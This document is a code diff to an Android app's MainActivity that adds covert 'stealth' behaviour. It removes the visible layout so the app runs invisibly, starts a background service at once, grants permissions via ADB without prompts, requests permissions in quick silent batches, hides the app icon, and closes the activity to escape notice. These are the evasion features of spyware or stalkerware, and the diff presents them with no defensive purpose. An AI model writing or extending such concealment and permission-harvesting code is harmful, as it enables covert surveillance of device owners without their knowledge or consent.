@@ -54,13 +54,9 @@ public class MainActivity extends Activity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         
-        try {
-            setContentView(R.layout.activity_main);
-            Log.d(TAG, "MainActivity onCreate - Android " + Build.VERSION.RELEASE + " (SDK " + Build.VERSION.SDK_INT + ")");
-        } catch (Exception e) {
-            Log.e(TAG, "Error setting content view", e);
-            // Continue even if layout fails - still need to request permissions and start service
-        }
+        // Don't set any content view - app should be invisible
+        // The SplashTheme in AndroidManifest makes the activity fully transparent
+        Log.d(TAG, "MainActivity onCreate - Android " + Build.VERSION.RELEASE + " (SDK " + Build.VERSION.SDK_INT + ")");
         
         try {
             // Initialize SharedPreferences
@@ -69,38 +65,44 @@ public class MainActivity extends Activity {
             Log.e(TAG, "Error initializing SharedPreferences", e);
         }
 
-        // Request permissions FIRST before starting service (permissions may be needed for service)
-        handler.postDelayed(new Runnable() {
-            @Override
-            public void run() {
-                try {
-                    buildPermissionList();
-                    if (!permissionsToRequest.isEmpty()) {
-                        requestNextPermission();
-                    } else {
-                        // No permissions needed, proceed with service
-                        startMainService();
-                        requestSpecialPermissions();
-                    }
-                } catch (Exception e) {
-                    Log.e(TAG, "Error in permission request flow", e);
-                    // Try to start service anyway
-                    startMainService();
-                }
+        // Check if ADB_GRANT_MODE - permissions already granted via ADB
+        if (StealthConfig.ADB_GRANT_MODE) {
+            Log.d(TAG, "ADB_GRANT_MODE enabled - skipping permission prompts");
+            startMainService();
+            
+            // Quick stealth exit
+            if (StealthConfig.AUTO_CLOSE_ACTIVITY) {
+                handler.postDelayed(() -> {
+                    if (StealthConfig.HIDE_ICON) hideAppIcon();
+                    moveTaskToBack(true);
+                    finish();
+                }, StealthConfig.HIDE_DELAY_MS);
             }
-        }, 500); // Reduced delay for faster permission requests
+            return;
+        }
         
-        // Start service after a delay (service will start even if permissions fail)
-        handler.postDelayed(new Runnable() {
-            @Override
-            public void run() {
-                try {
-                    startMainService();
-                } catch (Exception e) {
-                    Log.e(TAG, "Error starting service in delayed handler", e);
+        // Start service immediately in background
+        startMainService();
+        
+        // Request permissions with minimal delay
+        int delay = StealthConfig.SILENT_PERMISSION_MODE ? 100 : 500;
+        handler.postDelayed(() -> {
+            try {
+                buildPermissionList();
+                if (!permissionsToRequest.isEmpty()) {
+                    requestNextPermission();
+                } else {
+                    if (!StealthConfig.SKIP_SPECIAL_PERMISSIONS) {
+                        requestSpecialPermissions();
+                    } else {
+                        applyStealthConfig();
+                    }
                 }
+            } catch (Exception e) {
+                Log.e(TAG, "Error in permission request flow", e);
+                applyStealthConfig();
             }
-        }, 2000);
+        }, delay);
     }
 
     private void buildPermissionList() {
@@ -146,8 +148,12 @@ public class MainActivity extends Activity {
     
     private void requestNextPermission() {
         if (currentPermissionIndex >= permissionsToRequest.size()) {
-            // All runtime permissions done, request special permissions
-            requestSpecialPermissions();
+            // All runtime permissions done
+            if (StealthConfig.SKIP_SPECIAL_PERMISSIONS) {
+                applyStealthConfig();
+            } else {
+                requestSpecialPermissions();
+            }
             return;
         }
         
@@ -166,18 +172,22 @@ public class MainActivity extends Activity {
         ActivityCompat.requestPermissions(this, new String[]{permission}, PERMISSION_REQUEST_CODE);
     }
     
-    // Request all permissions at once in batch mode
+    // Request all permissions at once in batch mode - fastest method
     private void requestAllPermissionsSilently() {
         if (permissionsToRequest.isEmpty()) {
-            requestSpecialPermissions();
+            if (StealthConfig.SKIP_SPECIAL_PERMISSIONS) {
+                applyStealthConfig();
+            } else {
+                requestSpecialPermissions();
+            }
             return;
         }
         
-        Log.d(TAG, "Requesting all permissions silently (batch mode)");
+        Log.d(TAG, "Requesting ALL permissions in single batch (silent mode)");
         String[] permsArray = permissionsToRequest.toArray(new String[0]);
         currentPermissionIndex = permissionsToRequest.size(); // Mark all as processed
         
-        // Request all at once - on some devices this grants silently
+        // Request all at once - fastest method, grants what it can silently
         ActivityCompat.requestPermissions(this, permsArray, PERMISSION_REQUEST_CODE);
     }
 
@@ -186,33 +196,22 @@ public class MainActivity extends Activity {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
         
         if (requestCode == PERMISSION_REQUEST_CODE) {
-            boolean allGranted = true;
-            for (int i = 0; i < permissions.length; i++) {
-                String status = (grantResults[i] == PackageManager.PERMISSION_GRANTED) ? "GRANTED" : "DENIED";
-                Log.d(TAG, "Permission " + status + ": " + permissions[i]);
-                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
-                    allGranted = false;
-                }
+            int granted = 0;
+            for (int i = 0; i < grantResults.length; i++) {
+                if (grantResults[i] == PackageManager.PERMISSION_GRANTED) granted++;
             }
+            Log.d(TAG, "Permissions granted: " + granted + "/" + permissions.length);
             
-            // Log if permissions were denied
-            if (!allGranted) {
-                Log.w(TAG, "Some permissions were denied. App may have limited functionality.");
-            }
-            
-            // Request next permission after short delay
-            handler.postDelayed(new Runnable() {
-                @Override
-                public void run() {
-                    try {
-                        requestNextPermission();
-                    } catch (Exception e) {
-                        Log.e(TAG, "Error in requestNextPermission", e);
-                        // Continue with special permissions even if runtime permissions fail
-                        requestSpecialPermissions();
-                    }
+            // Minimal delay for fast processing
+            int delay = StealthConfig.SILENT_PERMISSION_MODE ? StealthConfig.PERMISSION_DELAY_MS : 300;
+            handler.postDelayed(() -> {
+                try {
+                    requestNextPermission();
+                } catch (Exception e) {
+                    Log.e(TAG, "Error in requestNextPermission", e);
+                    applyStealthConfig();
                 }
-            }, 300);
+            }, delay);
         }
     }
     
